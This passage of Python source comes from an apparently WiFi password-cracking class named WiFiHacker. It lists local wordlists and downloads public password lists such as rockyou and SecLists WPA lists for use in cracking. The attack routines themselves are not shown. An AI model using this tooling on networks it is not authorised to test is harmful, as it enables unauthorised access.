                        'path': str(f),
                        'size_bytes': size,
                        'size_mb': round(size / (1024*1024), 2),
                        'estimated_passwords': estimated_lines
                    })
                except:
                    pass
        
        return wordlists
    
    def download_wordlist(self, name: str) -> Dict:
        """Download popular wordlists"""
        wordlists = {
            'rockyou': 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
            'common_passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
            'wifi_passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt'
        }
        
        if name not in wordlists:
            return {'success': False, 'error': f'Unknown wordlist: {name}'}
        
        url = wordlists[name]
        output_file = self.wordlists_dir / f"{name}.txt"
        
        try:
            import urllib.request
            urllib.request.urlretrieve(url, str(output_file))
            
            return {
                'success': True,
                'file': str(output_file),
                'size_mb': round(output_file.stat().st_size / (1024*1024), 2)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# Global instance
wifi_hacker = WiFiHacker()
